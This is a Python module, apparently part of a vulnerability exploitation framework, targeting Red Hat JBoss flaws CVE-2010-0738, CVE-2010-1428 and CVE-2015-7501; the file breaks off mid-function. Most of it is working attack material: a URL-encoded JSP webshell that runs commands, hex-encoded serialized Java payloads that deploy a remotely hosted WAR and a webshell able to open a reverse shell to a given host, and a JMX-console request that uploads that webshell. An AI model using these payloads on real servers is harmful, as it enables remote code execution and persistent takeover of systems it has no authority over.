#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import time
from thirdparty import requests
import threading
import http.client
from module import globals
from core.verify import verify
from core.verify import misinformation
from module.md5 import random_md5
from urllib.parse import urlencode
from urllib.parse import urlparse, quote
from thirdparty.requests_toolbelt.utils import dump


class RedHatJBoss():
    def __init__(self, url):
        self.url = url
        if self.url[-1] == "/":
            self.url = self.url[:-1]
        self.raw_data = None
        self.vul_info = {}
        self.ua = globals.get_value("UA")  # 获取全局变量UA
        self.timeout = globals.get_value("TIMEOUT")  # 获取全局变量UA
        self.headers = globals.get_value("HEADERS")  # 获取全局变量HEADERS
        self.threadLock = threading.Lock()
        self.name = random_md5()[:-20]
        self.getipport = urlparse(self.url)
        self.hostname = self.getipport.hostname
        self.port = self.getipport.port
        if self.port == None and r"https://" in self.url:
            self.port = 443
        elif self.port == None and r"http://" in self.url:
            self.port = 80
        if r"https" in self.url:
            self.conn = http.client.HTTPSConnection(self.hostname, self.port)
        else:
            self.conn = http.client.HTTPConnection(self.hostname, self.port)
        self.headers = {
            "Content-Type": "application/x-java-serialized-object; class=org.jboss.invocation.MarshalledValue",
            "Accept": "text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2",
            'User-Agent': self.ua
        }

        self.jsp_webshell = ("%3c%25%40%20%70%61%67%65%20%6c%61%6e%67%75%61%67%65%3d%22%6a%61%76%61%22%20%69%6d%70"
                             "%6f%72%74%3d%22%6a%61%76%61%2e%75%74%69%6c%2e%2a%2c%6a%61%76%61%2e%69%6f%2e%2a%22%20%70%61%67%65%45%6e"
                             "%63%6f%64%69%6e%67%3d%22%55%54%46%2d%38%22%25%3e%3c%25%21%70%75%62%6c%69%63%20%73%74%61%74%69%63%20%53"
                             "%74%72%69%6e%67%20%65%78%63%75%74%65%43%6d%64%28%53%74%72%69%6e%67%20%63%29%20%7b%53%74%72%69%6e%67%42"
                             "%75%69%6c%64%65%72%20%6c%69%6e%65%20%3d%20%6e%65%77%20%53%74%72%69%6e%67%42%75%69%6c%64%65%72%28%29%3b"
                             "%74%72%79%20%7b%50%72%6f%63%65%73%73%20%70%72%6f%20%3d%20%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74"
                             "%69%6d%65%28%29%2e%65%78%65%63%28%63%29%3b%42%75%66%66%65%72%65%64%52%65%61%64%65%72%20%62%75%66%20%3d"
                             "%20%6e%65%77%20%42%75%66%66%65%72%65%64%52%65%61%64%65%72%28%6e%65%77%20%49%6e%70%75%74%53%74%72%65%61"
                             "%6d%52%65%61%64%65%72%28%70%72%6f%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29%29%29%3b%53%74%72"
                             "%69%6e%67%20%74%65%6d%70%20%3d%20%6e%75%6c%6c%3b%77%68%69%6c%65%20%28%28%74%65%6d%70%20%3d%20%62%75%66"
                             "%2e%72%65%61%64%4c%69%6e%65%28%29%29%20%21%3d%20%6e%75%6c%6c%29%20%7b%6c%69%6e%65%2e%61%70%70%65%6e%64"
                             "%28%74%65%6d%70%2b%22%5c%5c%6e%22%29%3b%7d%62%75%66%2e%63%6c%6f%73%65%28%29%3b%7d%20%63%61%74%63%68%20"
                             "%28%45%78%63%65%70%74%69%6f%6e%20%65%29%20%7b%6c%69%6e%65%2e%61%70%70%65%6e%64%28%65%2e%67%65%74%4d%65"
                             "%73%73%61%67%65%28%29%29%3b%7d%72%65%74%75%72%6e%20%6c%69%6e%65%2e%74%6f%53%74%72%69%6e%67%28%29%3b%7d"
                             "%25%3e%3c%25%69%66%28%22%70%61%73%73%77%6f%72%64%22%2e%65%71%75%61%6c%73%28%72%65%71%75%65%73%74%2e%67"
                             "%65%74%50%61%72%61%6d%65%74%65%72%28%22%70%77%64%22%29%29%26%26%21%22%22%2e%65%71%75%61%6c%73%28%72%65"
                             "%71%75%65%73%74%2e%67%65%74%50%61%72%61%6d%65%74%65%72%28%22%63%6d%64%22%29%29%29%7b%6f%75%74%2e%70%72"
                             "%69%6e%74%6c%6e%28%22%3c%70%72%65%3e%22%2b%65%78%63%75%74%65%43%6d%64%28%72%65%71%75%65%73%74%2e%67%65"
                             "%74%50%61%72%61%6d%65%74%65%72%28%22%63%6d%64%22%29%29%2b%22%3c%2f%70%72%65%3e%22%29%3b%7d%65%6c%73%65"
                             "%7b%6f%75%74%2e%70%72%69%6e%74%6c%6e%28%22%3a%2d%29%22%29%3b%7d%25%3e")
        self.payload_cve_2010_1428 = (
            "\xAC\xED\x00\x05\x73\x72\x00\x2E\x6F\x72\x67\x2E\x6A\x62\x6F\x73\x73\x2E\x63\x6F\x6E\x73\x6F"
            "\x6C\x65\x2E\x72\x65\x6D\x6F\x74\x65\x2E\x52\x65\x6D\x6F\x74\x65\x4D\x42\x65\x61\x6E\x49\x6E\x76"
            "\x6F\x63\x61\x74\x69\x6F\x6E\xE0\x4F\xA3\x7A\x74\xAE\x8D\xFA\x02\x00\x04\x4C\x00\x0A\x61\x63\x74"
            "\x69\x6F\x6E\x4E\x61\x6D\x65\x74\x00\x12\x4C\x6A\x61\x76\x61\x2F\x6C\x61\x6E\x67\x2F\x53\x74\x72"
            "\x69\x6E\x67\x3B\x5B\x00\x06\x70\x61\x72\x61\x6D\x73\x74\x00\x13\x5B\x4C\x6A\x61\x76\x61\x2F\x6C"
            "\x61\x6E\x67\x2F\x4F\x62\x6A\x65\x63\x74\x3B\x5B\x00\x09\x73\x69\x67\x6E\x61\x74\x75\x72\x65\x74"
            "\x00\x13\x5B\x4C\x6A\x61\x76\x61\x2F\x6C\x61\x6E\x67\x2F\x53\x74\x72\x69\x6E\x67\x3B\x4C\x00\x10"
            "\x74\x61\x72\x67\x65\x74\x4F\x62\x6A\x65\x63\x74\x4E\x61\x6D\x65\x74\x00\x1D\x4C\x6A\x61\x76\x61"
            "\x78\x2F\x6D\x61\x6E\x61\x67\x65\x6D\x65\x6E\x74\x2F\x4F\x62\x6A\x65\x63\x74\x4E\x61\x6D\x65\x3B"
            "\x78\x70\x74\x00\x06\x64\x65\x70\x6C\x6F\x79\x75\x72\x00\x13\x5B\x4C\x6A\x61\x76\x61\x2E\x6C\x61"
            "\x6E\x67\x2E\x4F\x62\x6A\x65\x63\x74\x3B\x90\xCE\x58\x9F\x10\x73\x29\x6C\x02\x00\x00\x78\x70\x00"
            "\x00\x00\x01\x73\x72\x00\x0C\x6A\x61\x76\x61\x2E\x6E\x65\x74\x2E\x55\x52\x4C\x96\x25\x37\x36\x1A"
            "\xFC\xE4\x72\x03\x00\x07\x49\x00\x08\x68\x61\x73\x68\x43\x6F\x64\x65\x49\x00\x04\x70\x6F\x72\x74"
            "\x4C\x00\x09\x61\x75\x74\x68\x6F\x72\x69\x74\x79\x71\x00\x7E\x00\x01\x4C\x00\x04\x66\x69\x6C\x65"
            "\x71\x00\x7E\x00\x01\x4C\x00\x04\x68\x6F\x73\x74\x71\x00\x7E\x00\x01\x4C\x00\x08\x70\x72\x6F\x74"
            "\x6F\x63\x6F\x6C\x71\x00\x7E\x00\x01\x4C\x00\x03\x72\x65\x66\x71\x00\x7E\x00\x01\x78\x70\xFF\xFF"
            "\xFF\xFF\xFF\xFF\xFF\xFF\x74\x00\x0E\x6A\x6F\x61\x6F\x6D\x61\x74\x6F\x73\x66\x2E\x63\x6F\x6D\x74"
            "\x00\x0F\x2F\x72\x6E\x70\x2F\x6A\x65\x78\x77\x73\x34\x2E\x77\x61\x72\x71\x00\x7E\x00\x0B\x74\x00"
            "\x04\x68\x74\x74\x70\x70\x78\x75\x72\x00\x13\x5B\x4C\x6A\x61\x76\x61\x2E\x6C\x61\x6E\x67\x2E\x53"
            "\x74\x72\x69\x6E\x67\x3B\xAD\xD2\x56\xE7\xE9\x1D\x7B\x47\x02\x00\x00\x78\x70\x00\x00\x00\x01\x74"
            "\x00\x0C\x6A\x61\x76\x61\x2E\x6E\x65\x74\x2E\x55\x52\x4C\x73\x72\x00\x1B\x6A\x61\x76\x61\x78\x2E"
            "\x6D\x61\x6E\x61\x67\x65\x6D\x65\x6E\x74\x2E\x4F\x62\x6A\x65\x63\x74\x4E\x61\x6D\x65\x0F\x03\xA7"
            "\x1B\xEB\x6D\x15\xCF\x03\x00\x00\x78\x70\x74\x00\x21\x6A\x62\x6F\x73\x73\x2E\x73\x79\x73\x74\x65"
            "\x6D\x3A\x73\x65\x72\x76\x69\x63\x65\x3D\x4D\x61\x69\x6E\x44\x65\x70\x6C\x6F\x79\x65\x72\x78")

        self.payload_cve_2015_7501 = (
            "\xAC\xED\x00\x05\x73\x72\x00\x29\x6F\x72\x67\x2E\x6A\x62\x6F\x73\x73\x2E\x69\x6E\x76\x6F\x63"
            "\x61\x74\x69\x6F\x6E\x2E\x4D\x61\x72\x73\x68\x61\x6C\x6C\x65\x64\x49\x6E\x76\x6F\x63\x61\x74\x69"
            "\x6F\x6E\xF6\x06\x95\x27\x41\x3E\xA4\xBE\x0C\x00\x00\x78\x70\x70\x77\x08\x78\x94\x98\x47\xC1\xD0"
            "\x53\x87\x73\x72\x00\x11\x6A\x61\x76\x61\x2E\x6C\x61\x6E\x67\x2E\x49\x6E\x74\x65\x67\x65\x72\x12"
            "\xE2\xA0\xA4\xF7\x81\x87\x38\x02\x00\x01\x49\x00\x05\x76\x61\x6C\x75\x65\x78\x72\x00\x10\x6A\x61"
            "\x76\x61\x2E\x6C\x61\x6E\x67\x2E\x4E\x75\x6D\x62\x65\x72\x86\xAC\x95\x1D\x0B\x94\xE0\x8B\x02\x00"
            "\x00\x78\x70\xE3\x2C\x60\xE6\x73\x72\x00\x24\x6F\x72\x67\x2E\x6A\x62\x6F\x73\x73\x2E\x69\x6E\x76"
            "\x6F\x63\x61\x74\x69\x6F\x6E\x2E\x4D\x61\x72\x73\x68\x61\x6C\x6C\x65\x64\x56\x61\x6C\x75\x65\xEA"
            "\xCC\xE0\xD1\xF4\x4A\xD0\x99\x0C\x00\x00\x78\x70\x7A\x00\x00\x04\x00\x00\x00\x09\xD3\xAC\xED\x00"
            "\x05\x75\x72\x00\x13\x5B\x4C\x6A\x61\x76\x61\x2E\x6C\x61\x6E\x67\x2E\x4F\x62\x6A\x65\x63\x74\x3B"
            "\x90\xCE\x58\x9F\x10\x73\x29\x6C\x02\x00\x00\x78\x70\x00\x00\x00\x04\x73\x72\x00\x1B\x6A\x61\x76"
            "\x61\x78\x2E\x6D\x61\x6E\x61\x67\x65\x6D\x65\x6E\x74\x2E\x4F\x62\x6A\x65\x63\x74\x4E\x61\x6D\x65"
            "\x0F\x03\xA7\x1B\xEB\x6D\x15\xCF\x03\x00\x00\x78\x70\x74\x00\x2C\x6A\x62\x6F\x73\x73\x2E\x61\x64"
            "\x6D\x69\x6E\x3A\x73\x65\x72\x76\x69\x63\x65\x3D\x44\x65\x70\x6C\x6F\x79\x6D\x65\x6E\x74\x46\x69"
            "\x6C\x65\x52\x65\x70\x6F\x73\x69\x74\x6F\x72\x79\x78\x74\x00\x05\x73\x74\x6F\x72\x65\x75\x71\x00"
            "\x7E\x00\x00\x00\x00\x00\x05\x74\x00\x0B\x6A\x65\x78\x69\x6E\x76\x34\x2E\x77\x61\x72\x74\x00\x07"
            "\x6A\x65\x78\x69\x6E\x76\x34\x74\x00\x04\x2E\x6A\x73\x70\x74\x08\x98\x3C\x25\x40\x20\x70\x61\x67"
            "\x65\x20\x69\x6D\x70\x6F\x72\x74\x3D\x22\x6A\x61\x76\x61\x2E\x6C\x61\x6E\x67\x2E\x2A\x2C\x6A\x61"
            "\x76\x61\x2E\x75\x74\x69\x6C\x2E\x2A\x2C\x6A\x61\x76\x61\x2E\x69\x6F\x2E\x2A\x2C\x6A\x61\x76\x61"
            "\x2E\x6E\x65\x74\x2E\x2A\x22\x20\x70\x61\x67\x65\x45\x6E\x63\x6F\x64\x69\x6E\x67\x3D\x22\x55\x54"
            "\x46\x2D\x38\x22\x25\x3E\x20\x3C\x70\x72\x65\x3E\x20\x3C\x25\x20\x63\x6C\x61\x73\x73\x20\x72\x76"
            "\x20\x65\x78\x74\x65\x6E\x64\x73\x20\x54\x68\x72\x65\x61\x64\x7B\x49\x6E\x70\x75\x74\x53\x74\x72"
            "\x65\x61\x6D\x20\x69\x73\x3B\x4F\x75\x74\x70\x75\x74\x53\x74\x72\x65\x61\x6D\x20\x6F\x73\x3B\x72"
            "\x76\x28\x49\x6E\x70\x75\x74\x53\x74\x72\x65\x61\x6D\x20\x69\x73\x2C\x4F\x75\x74\x70\x75\x74\x53"
            "\x74\x72\x65\x61\x6D\x20\x6F\x73\x29\x7B\x74\x68\x69\x73\x2E\x69\x73\x3D\x69\x73\x3B\x74\x68\x69"
            "\x73\x2E\x6F\x73\x3D\x6F\x73\x3B\x7D\x70\x75\x62\x6C\x69\x63\x20\x76\x6F\x69\x64\x20\x72\x75\x6E"
            "\x28\x29\x7B\x42\x75\x66\x66\x65\x72\x65\x64\x52\x65\x61\x64\x65\x72\x20\x69\x6E\x3D\x6E\x75\x6C"
            "\x6C\x3B\x42\x75\x66\x66\x65\x72\x65\x64\x57\x72\x69\x74\x65\x72\x20\x6F\x75\x74\x3D\x6E\x75\x6C"
            "\x6C\x3B\x74\x72\x79\x7B\x69\x6E\x3D\x6E\x65\x77\x20\x42\x75\x66\x66\x65\x72\x65\x64\x52\x65\x61"
            "\x64\x65\x72\x28\x6E\x65\x77\x20\x49\x6E\x70\x75\x74\x53\x74\x72\x65\x61\x6D\x52\x65\x61\x64\x65"
            "\x72\x28\x74\x68\x69\x73\x2E\x69\x73\x29\x29\x3B\x6F\x75\x74\x3D\x6E\x65\x77\x20\x42\x75\x66\x66"
            "\x65\x72\x65\x64\x57\x72\x69\x74\x65\x72\x28\x6E\x65\x77\x20\x4F\x75\x74\x70\x75\x74\x53\x74\x72"
            "\x65\x61\x6D\x57\x72\x69\x74\x65\x72\x28\x74\x68\x69\x73\x2E\x6F\x73\x29\x29\x3B\x63\x68\x61\x72"
            "\x20\x62\x5B\x5D\x3D\x6E\x65\x77\x20\x63\x68\x61\x72\x5B\x38\x31\x39\x32\x5D\x3B\x69\x6E\x74\x20"
            "\x6C\x3B\x77\x68\x69\x6C\x65\x28\x28\x6C\x3D\x69\x6E\x2E\x72\x65\x61\x64\x28\x62\x2C\x30\x2C\x62"
            "\x2E\x6C\x65\x6E\x67\x74\x68\x29\x29\x3E\x30\x29\x7B\x6F\x75\x74\x2E\x77\x72\x69\x74\x65\x28\x62"
            "\x2C\x30\x2C\x6C\x29\x3B\x6F\x75\x74\x2E\x66\x6C\x75\x73\x68\x28\x29\x3B\x7D\x7D\x63\x61\x74\x63"
            "\x68\x28\x45\x78\x63\x65\x70\x74\x69\x6F\x6E\x20\x65\x29\x7B\x7D\x7D\x7D\x53\x74\x72\x69\x6E\x67"
            "\x20\x73\x68\x3D\x6E\x75\x6C\x6C\x3B\x69\x66\x28\x72\x65\x71\x75\x65\x73\x74\x2E\x67\x65\x74\x50"
            "\x61\x72\x61\x6D\x65\x74\x65\x72\x28\x22\x70\x70\x70\x22\x29\x21\x3D\x6E\x75\x6C\x6C\x29\x7B\x73"
            "\x68\x3D\x72\x65\x71\x75\x65\x73\x74\x2E\x67\x65\x74\x50\x61\x72\x61\x6D\x65\x74\x65\x72\x28\x22"
            "\x70\x70\x70\x22\x29\x3B\x7D\x65\x6C\x73\x65\x20\x69\x66\x28\x72\x65\x71\x75\x65\x73\x74\x2E\x67"
            "\x65\x74\x48\x65\x61\x64\x65\x72\x28\x22\x58\x2D\x4A\x45\x58\x22\x29\x21\x3D\x20\x6E\x75\x6C\x6C"
            "\x29\x7B\x73\x68\x3D\x72\x65\x71\x75\x65\x73\x74\x2E\x67\x65\x74\x48\x65\x61\x64\x65\x72\x28\x22"
            "\x58\x2D\x4A\x45\x58\x22\x29\x3B\x7D\x69\x66\x28\x73\x68\x20\x21\x3D\x20\x6E\x75\x6C\x6C\x29\x7B"
            "\x72\x65\x73\x70\x6F\x6E\x73\x65\x2E\x73\x65\x74\x43\x6F\x6E\x74\x65\x6E\x74\x54\x79\x70\x65\x28"
            "\x22\x74\x65\x78\x74\x2F\x68\x74\x6D\x6C\x22\x29\x3B\x42\x75\x66\x66\x65\x72\x65\x64\x52\x65\x61"
            "\x64\x65\x72\x20\x62\x72\x3D\x6E\x75\x6C\x6C\x3B\x53\x74\x72\x69\x6E\x67\x20\x6C\x68\x63\x3D\x28"
            "\x6E\x65\x77\x20\x44\x61\x74\x65\x28\x29\x2E\x74\x6F\x53\x74\x72\x69\x6E\x67\x28\x29\x2E\x73\x70"
            "\x6C\x69\x74\x28\x22\x3A\x22\x29\x5B\x30\x5D\x2B\x22\x68\x2E\x6C\x6F\x67\x22\x29\x2E\x72\x65\x70"
            "\x6C\x61\x63\x65\x41\x6C\x6C\x28\x22\x20\x22\x2C\x22\x2D\x22\x29\x3B\x74\x72\x79\x7B\x69\x66\x28"
            "\x72\x65\x71\x75\x65\x73\x74\x2E\x67\x7A\x00\x00\x04\x00\x65\x74\x48\x65\x61\x64\x65\x72\x28\x22"
            "\x6E\x6F\x2D\x63\x68\x65\x63\x6B\x2D\x75\x70\x64\x61\x74\x65\x73\x22\x29\x3D\x3D\x6E\x75\x6C\x6C"
            "\x29\x7B\x48\x74\x74\x70\x55\x52\x4C\x43\x6F\x6E\x6E\x65\x63\x74\x69\x6F\x6E\x20\x63\x3D\x28\x48"
            "\x74\x74\x70\x55\x52\x4C\x43\x6F\x6E\x6E\x65\x63\x74\x69\x6F\x6E\x29\x6E\x65\x77\x20\x55\x52\x4C"
            "\x28\x22\x68\x74\x74\x70\x3A\x2F\x2F\x77\x65\x62\x73\x68\x65\x6C\x6C\x2E\x6A\x65\x78\x62\x6F\x73"
            "\x73\x2E\x6E\x65\x74\x2F\x6A\x73\x70\x5F\x76\x65\x72\x73\x69\x6F\x6E\x2E\x74\x78\x74\x22\x29\x2E"
            "\x6F\x70\x65\x6E\x43\x6F\x6E\x6E\x65\x63\x74\x69\x6F\x6E\x28\x29\x3B\x63\x2E\x73\x65\x74\x52\x65"
            "\x71\x75\x65\x73\x74\x50\x72\x6F\x70\x65\x72\x74\x79\x28\x22\x55\x73\x65\x72\x2D\x41\x67\x65\x6E"
            "\x74\x22\x2C\x72\x65\x71\x75\x65\x73\x74\x2E\x67\x65\x74\x48\x65\x61\x64\x65\x72\x28\x22\x48\x6F"
            "\x73\x74\x22\x29\x2B\x22\x3C\x2D\x22\x2B\x72\x65\x71\x75\x65\x73\x74\x2E\x67\x65\x74\x52\x65\x6D"
            "\x6F\x74\x65\x41\x64\x64\x72\x28\x29\x29\x3B\x69\x66\x28\x21\x6E\x65\x77\x20\x46\x69\x6C\x65\x28"
            "\x22\x63\x68\x65\x63\x6B\x5F\x22\x2B\x6C\x68\x63\x29\x2E\x65\x78\x69\x73\x74\x73\x28\x29\x29\x7B"
            "\x50\x72\x69\x6E\x74\x57\x72\x69\x74\x65\x72\x20\x77\x3D\x6E\x65\x77\x20\x50\x72\x69\x6E\x74\x57"
            "\x72\x69\x74\x65\x72\x28\x22\x63\x68\x65\x63\x6B\x5F\x22\x2B\x6C\x68\x63\x29\x3B\x77\x2E\x63\x6C"
            "\x6F\x73\x65\x28\x29\x3B\x62\x72\x3D\x6E\x65\x77\x20\x42\x75\x66\x66\x65\x72\x65\x64\x52\x65\x61"
            "\x64\x65\x72\x28\x6E\x65\x77\x20\x49\x6E\x70\x75\x74\x53\x74\x72\x65\x61\x6D\x52\x65\x61\x64\x65"
            "\x72\x28\x63\x2E\x67\x65\x74\x49\x6E\x70\x75\x74\x53\x74\x72\x65\x61\x6D\x28\x29\x29\x29\x3B\x53"
            "\x74\x72\x69\x6E\x67\x20\x6C\x76\x3D\x62\x72\x2E\x72\x65\x61\x64\x4C\x69\x6E\x65\x28\x29\x2E\x73"
            "\x70\x6C\x69\x74\x28\x22\x20\x22\x29\x5B\x31\x5D\x3B\x69\x66\x28\x21\x6C\x76\x2E\x65\x71\x75\x61"
            "\x6C\x73\x28\x22\x34\x22\x29\x29\x7B\x6F\x75\x74\x2E\x70\x72\x69\x6E\x74\x28\x22\x4E\x65\x77\x20"
            "\x76\x65\x72\x73\x69\x6F\x6E\x2E\x20\x50\x6C\x65\x61\x73\x65\x20\x75\x70\x64\x61\x74\x65\x21\x22"
            "\x29\x3B\x7D\x7D\x65\x6C\x73\x65\x20\x69\x66\x28\x73\x68\x2E\x69\x6E\x64\x65\x78\x4F\x66\x28\x22"
            "\x69\x64\x22\x29\x21\x3D\x2D\x31\x7C\x7C\x73\x68\x2E\x69\x6E\x64\x65\x78\x4F\x66\x28\x22\x69\x70"
            "\x63\x6F\x6E\x66\x69\x67\x22\x29\x21\x3D\x2D\x31\x29\x7B\x63\x2E\x67\x65\x74\x49\x6E\x70\x75\x74"
            "\x53\x74\x72\x65\x61\x6D\x28\x29\x3B\x7D\x7D\x7D\x63\x61\x74\x63\x68\x28\x45\x78\x63\x65\x70\x74"
            "\x69\x6F\x6E\x20\x65\x29\x7B\x6F\x75\x74\x2E\x70\x72\x69\x6E\x74\x6C\x6E\x28\x22\x46\x61\x69\x6C"
            "\x65\x64\x20\x74\x6F\x20\x63\x68\x65\x63\x6B\x20\x66\x6F\x72\x20\x75\x70\x64\x61\x74\x65\x73\x22"
            "\x29\x3B\x7D\x74\x72\x79\x7B\x50\x72\x6F\x63\x65\x73\x73\x20\x70\x3B\x62\x6F\x6F\x6C\x65\x61\x6E"
            "\x20\x6E\x69\x78\x3D\x74\x72\x75\x65\x3B\x69\x66\x28\x21\x53\x79\x73\x74\x65\x6D\x2E\x67\x65\x74"
            "\x50\x72\x6F\x70\x65\x72\x74\x79\x28\x22\x66\x69\x6C\x65\x2E\x73\x65\x70\x61\x72\x61\x74\x6F\x72"
            "\x22\x29\x2E\x65\x71\x75\x61\x6C\x73\x28\x22\x2F\x22\x29\x29\x7B\x6E\x69\x78\x3D\x66\x61\x6C\x73"
            "\x65\x3B\x7D\x69\x66\x28\x73\x68\x2E\x69\x6E\x64\x65\x78\x4F\x66\x28\x22\x6A\x65\x78\x72\x65\x6D"
            "\x6F\x74\x65\x3D\x22\x29\x21\x3D\x2D\x31\x29\x7B\x53\x6F\x63\x6B\x65\x74\x20\x73\x63\x3D\x6E\x65"
            "\x77\x20\x53\x6F\x63\x6B\x65\x74\x28\x73\x68\x2E\x73\x70\x6C\x69\x74\x28\x22\x3D\x22\x29\x5B\x31"
            "\x5D\x2E\x73\x70\x6C\x69\x74\x28\x22\x3A\x22\x29\x5B\x30\x5D\x2C\x49\x6E\x74\x65\x67\x65\x72\x2E"
            "\x70\x61\x72\x73\x65\x49\x6E\x74\x28\x73\x68\x2E\x73\x70\x6C\x69\x74\x28\x22\x3A\x22\x29\x5B\x31"
            "\x5D\x29\x29\x3B\x69\x66\x28\x6E\x69\x78\x29\x7B\x73\x68\x3D\x22\x2F\x62\x69\x6E\x2F\x62\x61\x73"
            "\x68\x22\x3B\x7D\x65\x6C\x73\x65\x7B\x73\x68\x3D\x22\x63\x6D\x64\x2E\x65\x78\x65\x22\x3B\x7D\x70"
            "\x3D\x52\x75\x6E\x74\x69\x6D\x65\x2E\x67\x65\x74\x52\x75\x6E\x74\x69\x6D\x65\x28\x29\x2E\x65\x78"
            "\x65\x63\x28\x73\x68\x29\x3B\x28\x6E\x65\x77\x20\x72\x76\x28\x70\x2E\x67\x65\x74\x49\x6E\x70\x75"
            "\x74\x53\x74\x72\x65\x61\x6D\x28\x29\x2C\x73\x63\x2E\x67\x65\x74\x4F\x75\x74\x70\x75\x74\x53\x74"
            "\x72\x65\x61\x6D\x28\x29\x29\x29\x2E\x73\x74\x61\x72\x74\x28\x29\x3B\x28\x6E\x65\x77\x20\x72\x76"
            "\x28\x73\x63\x2E\x67\x65\x74\x49\x6E\x70\x75\x74\x53\x74\x72\x65\x61\x6D\x28\x29\x2C\x70\x2E\x67"
            "\x65\x74\x4F\x75\x74\x70\x7A\x00\x00\x01\xDB\x75\x74\x53\x74\x72\x65\x61\x6D\x28\x29\x29\x29\x2E"
            "\x73\x74\x61\x72\x74\x28\x29\x3B\x7D\x65\x6C\x73\x65\x7B\x69\x66\x28\x6E\x69\x78\x29\x7B\x70\x3D"
            "\x52\x75\x6E\x74\x69\x6D\x65\x2E\x67\x65\x74\x52\x75\x6E\x74\x69\x6D\x65\x28\x29\x2E\x65\x78\x65"
            "\x63\x28\x6E\x65\x77\x20\x53\x74\x72\x69\x6E\x67\x5B\x5D\x7B\x22\x2F\x62\x69\x6E\x2F\x62\x61\x73"
            "\x68\x22\x2C\x22\x2D\x63\x22\x2C\x73\x68\x7D\x29\x3B\x7D\x65\x6C\x73\x65\x7B\x70\x3D\x52\x75\x6E"
            "\x74\x69\x6D\x65\x2E\x67\x65\x74\x52\x75\x6E\x74\x69\x6D\x65\x28\x29\x2E\x65\x78\x65\x63\x28\x22"
            "\x63\x6D\x64\x2E\x65\x78\x65\x20\x2F\x43\x20\x22\x2B\x73\x68\x29\x3B\x7D\x62\x72\x3D\x6E\x65\x77"
            "\x20\x42\x75\x66\x66\x65\x72\x65\x64\x52\x65\x61\x64\x65\x72\x28\x6E\x65\x77\x20\x49\x6E\x70\x75"
            "\x74\x53\x74\x72\x65\x61\x6D\x52\x65\x61\x64\x65\x72\x28\x70\x2E\x67\x65\x74\x49\x6E\x70\x75\x74"
            "\x53\x74\x72\x65\x61\x6D\x28\x29\x29\x29\x3B\x53\x74\x72\x69\x6E\x67\x20\x64\x3D\x62\x72\x2E\x72"
            "\x65\x61\x64\x4C\x69\x6E\x65\x28\x29\x3B\x77\x68\x69\x6C\x65\x28\x64\x20\x21\x3D\x20\x6E\x75\x6C"
            "\x6C\x29\x7B\x6F\x75\x74\x2E\x70\x72\x69\x6E\x74\x6C\x6E\x28\x64\x29\x3B\x64\x3D\x62\x72\x2E\x72"
            "\x65\x61\x64\x4C\x69\x6E\x65\x28\x29\x3B\x7D\x7D\x7D\x63\x61\x74\x63\x68\x28\x45\x78\x63\x65\x70"
            "\x74\x69\x6F\x6E\x20\x65\x29\x7B\x6F\x75\x74\x2E\x70\x72\x69\x6E\x74\x6C\x6E\x28\x22\x55\x6E\x6B"
            "\x6E\x6F\x77\x6E\x20\x63\x6F\x6D\x6D\x61\x6E\x64\x22\x29\x3B\x7D\x7D\x25\x3E\x73\x72\x00\x11\x6A"
            "\x61\x76\x61\x2E\x6C\x61\x6E\x67\x2E\x42\x6F\x6F\x6C\x65\x61\x6E\xCD\x20\x72\x80\xD5\x9C\xFA\xEE"
            "\x02\x00\x01\x5A\x00\x05\x76\x61\x6C\x75\x65\x78\x70\x01\x75\x72\x00\x13\x5B\x4C\x6A\x61\x76\x61"
            "\x2E\x6C\x61\x6E\x67\x2E\x53\x74\x72\x69\x6E\x67\x3B\xAD\xD2\x56\xE7\xE9\x1D\x7B\x47\x02\x00\x00"
            "\x78\x70\x00\x00\x00\x05\x74\x00\x10\x6A\x61\x76\x61\x2E\x6C\x61\x6E\x67\x2E\x53\x74\x72\x69\x6E"
            "\x67\x71\x00\x7E\x00\x0F\x71\x00\x7E\x00\x0F\x71\x00\x7E\x00\x0F\x74\x00\x07\x62\x6F\x6F\x6C\x65"
            "\x61\x6E\xF9\x12\x63\x17\x78\x77\x08\x00\x00\x00\x00\x00\x00\x00\x01\x73\x72\x00\x22\x6F\x72\x67"
            "\x2E\x6A\x62\x6F\x73\x73\x2E\x69\x6E\x76\x6F\x63\x61\x74\x69\x6F\x6E\x2E\x49\x6E\x76\x6F\x63\x61"
            "\x74\x69\x6F\x6E\x4B\x65\x79\xB8\xFB\x72\x84\xD7\x93\x85\xF9\x02\x00\x01\x49\x00\x07\x6F\x72\x64"
            "\x69\x6E\x61\x6C\x78\x70\x00\x00\x00\x04\x70\x78")

    # 2020-09-23
    def cve_2010_0738_poc(self):
        self.threadLock.acquire()
        self.vul_info["prt_name"] = "RedHat JBoss: CVE-2010-0738"
        self.vul_info["prt_resu"] = "null"
        self.vul_info["prt_info"] = "null"
        self.vul_info["vul_urls"] = self.url
        self.vul_info["vul_payd"] = "null"
        self.vul_info["vul_name"] = "JBoss JMX控制台安全验证绕过漏洞"
        self.vul_info["vul_numb"] = "CVE-2010-0738"
        self.vul_info["vul_apps"] = "JBoss"
        self.vul_info["vul_date"] = "2014-03-21"
        self.vul_info["vul_vers"] = "4.2.0 - 4.3.0"
        self.vul_info["vul_risk"] = "high"
        self.vul_info["vul_type"] = "任意文件上传"
        self.vul_info["vul_data"] = "null"
        self.vul_info["vul_desc"] = "CVE-2010-0738漏洞利用了HTTP中HEAD请求方法，绕过了对GET和POST请求的限制，" \
                                    "成功地再次利用jboss.admin -> DeploymentFileRepository -> store()方法上传文件。"
        self.vul_info["cre_date"] = "2021-01-28"
        self.vul_info["cre_auth"] = "zhzyker"
        http.client.HTTPConnection._http_vsn_str = 'HTTP/1.1'
        self.path = "/jmx-console/HtmlAdaptor"
        md = random_md5()
        self.data = md
        self.poc = ("?action=invokeOpByName&name=jboss.admin:service=DeploymentFileRepository&methodName="
                    "store&argType=java.lang.String&arg0=shells.war&argType=java.lang.String&arg1=shells&argType=java"
                    ".lang.String&arg2=.jsp&argType=java.lang.String&arg3=" + self.data + "&argType=boolean&arg4=True")
        self.exp = ("?action=invokeOpByName&name=jboss.admin:service=DeploymentFileRepository&methodName="
                    "store&argType=java.lang.String&arg0=" + self.name + ".war&argType=java.lang.String&arg1=" + self.name + "&argType=java"
                                                                                                                             ".lang.String&arg2=.jsp&argType=java.lang.String&arg3=" + self.jsp_webshell + "&argType=boolean&arg4=True")
        self.headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                        'User-Agent': self.ua,
                        "Connection": "keep-alive"}
        try:
